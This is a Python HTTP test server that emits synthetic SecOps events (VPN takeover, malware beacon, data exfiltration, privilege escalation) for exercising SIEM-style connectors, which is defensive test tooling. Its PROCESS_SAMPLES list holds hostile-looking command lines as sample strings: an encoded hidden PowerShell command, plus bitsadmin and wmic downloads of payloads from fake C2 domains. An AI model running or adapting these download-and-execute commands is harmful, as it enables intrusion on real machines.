#!/usr/bin/env python3
"""
Random Event Test Server
------------------------

This lightweight HTTP server simulates an external datasource that emits
randomised observability/security events. Use it to exercise HALCYON
Datasource Studio connectors (e.g. HTTP pollers or webhooks) without
requiring access to real systems.

Endpoints
~~~~~~~~~
- GET /events      → returns a JSON array of random event objects
- GET /healthz     → returns { "status": "ok" } for liveness checks

Usage
~~~~~
    python server.py

By default the server listens on localhost:1997. Override via the
environment variables RANDOM_EVENT_HOST / RANDOM_EVENT_PORT.
"""

from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import json
import os
import random
import socket
import string
import threading
import time
import uuid

HOST = os.getenv("RANDOM_EVENT_HOST", "127.0.0.1")
PORT = int(os.getenv("RANDOM_EVENT_PORT", "1997"))

# Curated scenario data pools for SecOps storyline
REGIONS = ["us-east-1", "us-west-2", "eu-central-1", "ap-southeast-1", "eu-west-1"]

USERS = [
    {"username": "jdoe", "department": "Finance"},
    {"username": "akhan", "department": "Finance"},
    {"username": "lsantos", "department": "Engineering"},
    {"username": "qyang", "department": "Operations"},
    {"username": "tcarter", "department": "Executive"},
]

ASSETS = [
    {"hostname": "vpn-gw-02.corp.local", "ip": "10.0.12.5", "role": "vpn-gateway"},
    {"hostname": "fin-work-14.corp.local", "ip": "10.2.44.87", "role": "workstation"},
    {"hostname": "crm-prod-01.corp.local", "ip": "10.4.18.21", "role": "application"},
    {"hostname": "files-prod-03.corp.local", "ip": "10.12.33.54", "role": "file-server"},
    {"hostname": "edr-agent-32.corp.local", "ip": "10.7.65.90", "role": "endpoint"},
]

GEO_LOCATIONS = [
    {"country": "United States", "region": "Virginia", "city": "Ashburn", "latitude": 39.0438, "longitude": -77.4874},
    {"country": "Germany", "region": "Hesse", "city": "Frankfurt", "latitude": 50.1109, "longitude": 8.6821},
    {"country": "Singapore", "region": "Central", "city": "Singapore", "latitude": 1.3521, "longitude": 103.8198},
    {"country": "Brazil", "region": "São Paulo", "city": "São Paulo", "latitude": -23.5505, "longitude": -46.6333},
    {"country": "United Kingdom", "region": "England", "city": "London", "latitude": 51.5072, "longitude": -0.1276},
]

THREAT_FEEDS = ["AlienVault OTX", "AbuseIPDB", "Recorded Future", "CrowdStrike Intel", "Mandiant Advantage"]
WHOIS_ORGS = ["DigitalOcean, LLC", "Amazon.com, Inc.", "OVHcloud", "Tencent Cloud", "Akamai Technologies"]
ABUSE_CONTACTS = ["abuse@digitalocean.com", "abuse@amazonaws.com", "cert@ovh.net", "security@akamai.com"]
C2_DOMAINS = ["telemetry-update.net", "cdn-sync-info.com", "secure-cloudproxy.io", "login-session-check.net", "update-service-alert.com"]
MALWARE_FAMILIES = ["CobaltStrike", "Emotet", "AsyncRAT", "QakBot", "LockBit Loader"]
CLOUD_SERVICES = ["Amazon S3", "Dropbox Business", "Google Drive Enterprise", "Box Enterprise", "Azure Blob Storage"]
PRIV_ESC_ROLES = ["Global Administrator", "Security Administrator", "Domain Admin", "Privileged Role Administrator", "Subscription Owner"]
PRIV_ESC_METHODS = [
    "legacy app consent grant",
    "service principal key leak",
    "out-of-band script execution",
    "unapproved role assignment",
    "token replay from unmanaged device",
]
PROCESS_SAMPLES = [
    "powershell.exe -nop -w hidden -enc SQBFAFgAUwA9ACcAaAB0AHQAcAA6AC8ALwB{domain}",
    "cmd.exe /c \"bitsadmin /transfer update http://{domain}/stage.bin\"",
    "rundll32.exe C:\\Windows\\Temp\\{family}.dll,Start",
    "wmic process call create \"powershell (New-Object Net.WebClient).DownloadFile('http://{domain}/payload.bin','C:\\ProgramData\\svc.dll')\"",
]
INGEST_CHANNELS = ["syslog", "webhook", "poller"]


def random_ip() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def iso_timestamp() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())


def random_hostname() -> str:
    prefix = "".join(random.choices(string.ascii_lowercase, k=6))
    domain = random.choice(["corp", "cloud", "internal", "edge"])
    tld = random.choice(["local", "lan", "example"])
    return f"{prefix}.{domain}.{tld}"


def random_score(low: float = 0.6, high: float = 0.97) -> float:
    return round(random.uniform(low, high), 2)


def random_sha256() -> str:
    return uuid.uuid4().hex + uuid.uuid4().hex


def suspicious_vpn_event() -> dict:
    user = random.choice(USERS)
    geo = random.choice(GEO_LOCATIONS)
    asset = random.choice(ASSETS)
    failures = random.randint(9, 18)
    source_ip = random_ip()
    scenario = "SecOps::Suspicious VPN Session"
    summary = (
        f"{failures} failed VPN logins detected for {user['username']} from "
        f"{geo['city']}, {geo['country']} followed by a successful login."
    )
    return {
        "eventId": str(uuid.uuid4()),
        "timestamp": iso_timestamp(),
        "scenario": scenario,
        "eventType": "auth.vpn.anomaly",
        "summary": summary,
        "severity": "high",
        "score": random_score(0.82, 0.96),
        "tags": [
            "secops",
            "vpn",
            "account-takeover",
            geo["country"].lower().replace(" ", "-"),
        ],
        "entity": {
            "type": "User",
            "id": user["username"],
            "username": user["username"],
            "department": user["department"],
            "hostname": asset["hostname"],
            "ip": asset["ip"],
        },
        "source": {
            "system": random.choice(["okta", "vpn-gateway", "sso"]),
            "region": random.choice(REGIONS),
            "detector": random.choice(["Okta Workforce Identity", "Cisco Duo", "Zscaler ZIA"]),
            "ingest": random.choice(INGEST_CHANNELS),
        },
        "ioc": {
            "type": "ip",
            "indicator": source_ip,
            "confidence": random_score(0.7, 0.9),
            "threatList": random.choice(THREAT_FEEDS),
        },
        "killChain": {
            "stage": "Credential Access",
            "confidence": random_score(0.7, 0.95),
        },
        "recommendedPlaybook": {
            "id": "pb-block-vpn-session",
            "name": "Block IP and reset user session",
        },
        "recommendedActions": [
            "block_ip",
            "force_password_reset",
            "notify_user",
        ],
        "caseTemplate": {
            "title": f"Potential Account Takeover: {user['username']}",
            "summary": (
                f"Automated detection flagged VPN anomalies for {user['username']} "
                f"originating from {geo['city']}, {geo['country']}."
            ),
            "priority": "P1",
            "assignment": "SecOps Tier 1",
        },
        "enrichment": {
            "geoip": {**geo, "ip": source_ip},
            "whois": {
                "org": random.choice(WHOIS_ORGS),
                "asn": random.randint(1000, 9999),
                "abuse": random.choice(ABUSE_CONTACTS),
            },
            "threatIntel": {
                "source": random.choice(THREAT_FEEDS),
                "confidence": random_score(0.65, 0.9),
            },
        },
        "notableEvidence": [
            {"field": "failedAttempts5m", "value": failures},
            {"field": "mfaBypass", "value": random.choice([True, False])},
            {"field": "newDevice", "value": random.choice(["yes", "no"])},
        ],
    }


def malware_beacon_event() -> dict:
    asset = random.choice(ASSETS)
    domain = random.choice(C2_DOMAINS)
    family = random.choice(MALWARE_FAMILIES)
    sha = random_sha256()
    process_cmd = random.choice(PROCESS_SAMPLES).format(domain=domain, family=family.lower())
    geo = random.choice(GEO_LOCATIONS)
    ioc_type = random.choice(["domain", "sha256"])
    indicator = domain if ioc_type == "domain" else sha
    summary = (
        f"{asset['hostname']} beaconed to {domain} associated with {family} command-and-control infrastructure."
    )
    return {
        "eventId": str(uuid.uuid4()),
        "timestamp": iso_timestamp(),
        "scenario": "SecOps::Malware Beacon",
        "eventType": "network.c2.beacon",
        "summary": summary,
        "severity": "critical",
        "score": random_score(0.88, 0.99),
        "tags": [
            "secops",
            "malware",
            "c2",
            family.lower().replace(" ", "-"),
        ],
        "entity": {
            "type": "Endpoint",
            "id": asset["hostname"],
            "hostname": asset["hostname"],
            "ip": asset["ip"],
            "role": asset["role"],
        },
        "source": {
            "system": random.choice(["edr", "ids", "siem"]),
            "region": random.choice(REGIONS),
            "detector": random.choice(["CrowdStrike Falcon", "Carbon Black EDR", "Microsoft Defender ATP"]),
            "ingest": random.choice(INGEST_CHANNELS),
        },
        "ioc": {
            "type": ioc_type,
            "indicator": indicator,
            "hash": sha,
            "confidence": random_score(0.75, 0.95),
        },
        "killChain": {
            "stage": "Command and Control",
            "confidence": random_score(0.8, 0.97),
        },
        "recommendedPlaybook": {
            "id": "pb-isolate-host",
            "name": "Isolate endpoint and run malware response",
        },
        "recommendedActions": [
            "isolate_host",
            "block_domain",
            "open_case",
        ],
        "caseTemplate": {
            "title": f"Malware Beacon on {asset['hostname']}",
            "summary": f"Endpoint communicating with {family} infrastructure at {domain}.",
            "priority": "P0",
            "assignment": "SecOps Incident Response",
        },
        "enrichment": {
            "geoip": {**geo, "ip": domain},
            "virustotal": {
                "positives": random.randint(18, 62),
                "link": f"https://www.virustotal.com/gui/domain/{domain}",
                "lastSeen": iso_timestamp(),
            },
            "threatIntel": {
                "source": random.choice(THREAT_FEEDS),
                "family": family,
                "confidence": random_score(0.85, 0.98),
            },
        },
        "notableEvidence": [
            {"field": "process", "value": process_cmd},
            {"field": "destDomain", "value": domain},
            {"field": "sha256", "value": sha},
        ],
    }


def format_bytes(num_bytes: int) -> str:
    units = ["B", "KB", "MB", "GB", "TB", "PB"]
    value = float(num_bytes)
    for unit in units:
        if value < 1024.0:
            return f"{value:.1f} {unit}"
        value /= 1024.0
    return f"{value:.1f} EB"


def data_exfiltration_event() -> dict:
    user = random.choice(USERS)
    asset = random.choice(ASSETS)
    cloud_service = random.choice(CLOUD_SERVICES)
    bytes_exfil = random.randint(18, 64) * 1024 * 1024
    dest_ip = random_ip()
    slug = cloud_service.lower().replace(" ", "")
    summary = (
        f"{user['username']} transferred {format_bytes(bytes_exfil)} to {cloud_service} "
        f"from {asset['hostname']} outside approved hours."
    )
    return {
        "eventId": str(uuid.uuid4()),
        "timestamp": iso_timestamp(),
        "scenario": "SecOps::Data Exfiltration",
        "eventType": "dlp.data_exfiltration",
        "summary": summary,
        "severity": "high",
        "score": random_score(0.81, 0.94),
        "tags": ["secops", "data-exfil", "dlp"],
        "entity": {
            "type": "User",
            "id": user["username"],
            "username": user["username"],
            "department": user["department"],
            "hostname": asset["hostname"],
            "ip": asset["ip"],
        },
        "source": {
            "system": random.choice(["siem", "dlp", "proxy"]),
            "region": random.choice(REGIONS),
            "detector": random.choice(["Splunk ES", "Netskope DLP", "Proofpoint CASB"]),
            "ingest": random.choice(INGEST_CHANNELS),
        },
        "ioc": {
            "type": "url",
            "indicator": f"https://{slug}.secure-upload.example/{uuid.uuid4().hex[:12]}",
            "confidence": random_score(0.7, 0.92),
        },
        "killChain": {
            "stage": "Exfiltration",
            "confidence": random_score(0.78, 0.9),
        },
        "recommendedPlaybook": {
            "id": "pb-dlp-response",
            "name": "Contain data exfiltration attempt",
        },
        "recommendedActions": [
            "disable_account",
            "revoke_tokens",
            "notify_dlp_team",
        ],
        "caseTemplate": {
            "title": f"Possible Data Exfiltration by {user['username']}",
            "summary": summary,
            "priority": "P1",
            "assignment": "SecOps Tier 2",
        },
        "enrichment": {
            "geoip": {"country": "Unknown", "region": "Cloud", "city": "N/A", "ip": dest_ip},
            "dlpPolicies": [
                {"policy": "Company Confidential Export", "matches": random.randint(5, 18)},
                {"policy": "PII Upload", "matches": random.randint(1, 6)},
            ],
            "threatIntel": {
                "source": random.choice(THREAT_FEEDS),
                "confidence": random_score(0.6, 0.85),
            },
        },
        "notableEvidence": [
            {"field": "bytesExfiltrated", "value": bytes_exfil},
            {"field": "destinationService", "value": cloud_service},
            {"field": "outsideBusinessHours", "value": True},
        ],
    }


def privilege_escalation_event() -> dict:
    user = random.choice(USERS)
    role = random.choice(PRIV_ESC_ROLES)
    method = random.choice(PRIV_ESC_METHODS)
    actor = random.choice(["service_principal", "automation_account", "unknown"])
    source_ip = random_ip()
    summary = (
        f"New {role} role granted to {user['username']} via {method} by {actor.replace('_', ' ')}."
    )
    return {
        "eventId": str(uuid.uuid4()),
        "timestamp": iso_timestamp(),
        "scenario": "SecOps::Privilege Escalation",
        "eventType": "iam.privilege_escalation",
        "summary": summary,
        "severity": "high",
        "score": random_score(0.79, 0.93),
        "tags": ["secops", "privilege", "iam"],
        "entity": {
            "type": "User",
            "id": user["username"],
            "username": user["username"],
            "department": user["department"],
            "hostname": random.choice(ASSETS)["hostname"],
            "ip": source_ip,
        },
        "source": {
            "system": random.choice(["iam", "ids", "siem"]),
            "region": random.choice(REGIONS),
            "detector": random.choice(["Azure AD Identity Protection", "AWS GuardDuty", "Elastic SIEM"]),
            "ingest": random.choice(INGEST_CHANNELS),
        },
        "ioc": {
            "type": "user",
            "indicator": user["username"],
            "confidence": random_score(0.68, 0.9),
            "evidence": method,
        },
        "killChain": {
            "stage": "Privilege Escalation",
            "confidence": random_score(0.74, 0.9),
        },
        "recommendedPlaybook": {
            "id": "pb-privilege-reset",
            "name": "Revoke elevated privileges and investigate",
        },
        "recommendedActions": [
            "revoke_role",
            "force_password_reset",
            "open_case",
        ],
        "caseTemplate": {
            "title": f"Unauthorized Privilege Escalation for {user['username']}",
            "summary": summary,
            "priority": "P1",
            "assignment": "SecOps IAM Response",
        },
        "enrichment": {
            "iamContext": {
                "previousRoles": random.sample(PRIV_ESC_ROLES, k=2),
                "actorType": actor,
            },
            "geoip": random.choice(GEO_LOCATIONS),
            "changeTicket": random.choice(["None", f"INC-{random.randint(4000, 9000)}"]),
        },
        "notableEvidence": [
            {"field": "actor", "value": actor},
            {"field": "method", "value": method},
            {"field": "justificationProvided", "value": random.choice([True, False])},
        ],
    }


SCENARIO_GENERATORS = [
    suspicious_vpn_event,
    malware_beacon_event,
    data_exfiltration_event,
    privilege_escalation_event,
]


def generate_event() -> dict:
    generator = random.choice(SCENARIO_GENERATORS)
    return generator()


class RandomEventHandler(BaseHTTPRequestHandler):
    server_version = "RandomEventHTTP/1.0"

    def _send_json(self, payload: dict | list, status: int = 200) -> None:
        body = json.dumps(payload).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format: str, *args) -> None:  # noqa: A003
        # Reduce console noise: log to stdout with timestamp + client info
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        message = format % args
        print(f"[{timestamp}] {self.client_address[0]}:{self.client_address[1]} {message}")

    def do_GET(self):  # noqa: N802
        if self.path.rstrip("/") == "/healthz":
            self._send_json({"status": "ok"})
            return

        if self.path.rstrip("/") == "/events":
            batch_size = random.randint(3, 6)
            events = [generate_event() for _ in range(batch_size)]
            self._send_json(events)
            return

        self._send_json({"error": "Not found"}, status=404)


def run_server() -> ThreadingHTTPServer:
    server = ThreadingHTTPServer((HOST, PORT), RandomEventHandler)
    sa = server.socket.getsockname()
    print(f"Random Event Test Server listening on http://{sa[0]}:{sa[1]}")
    print("Endpoints: /healthz, /events")

    def serve():
        with server:
            server.serve_forever()

    thread = threading.Thread(target=serve, daemon=True)
    thread.start()
    return server


if __name__ == "__main__":
    try:
        srv = run_server()
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        print("\nShutting down random event server...")
        srv.shutdown()

